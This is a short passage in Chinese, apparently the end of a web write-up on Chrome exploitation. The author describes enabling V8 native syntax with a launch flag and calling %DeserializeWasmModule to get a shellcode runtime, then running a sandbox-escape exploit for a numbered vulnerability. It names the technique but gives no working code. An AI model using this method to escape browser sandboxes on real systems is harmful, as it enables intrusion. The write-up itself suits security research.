我并没有用RCE漏洞，而是直接使用了V8内置百分号函数%DeserializeWasmModule等来实现一个shellcode执行环境，所以我在启动参数使用了–js-flags=“-allow-natives-syntax”，最后在shellcode中解析并执行2783的沙箱逃逸exp</p>
</div>
</body>

</html>
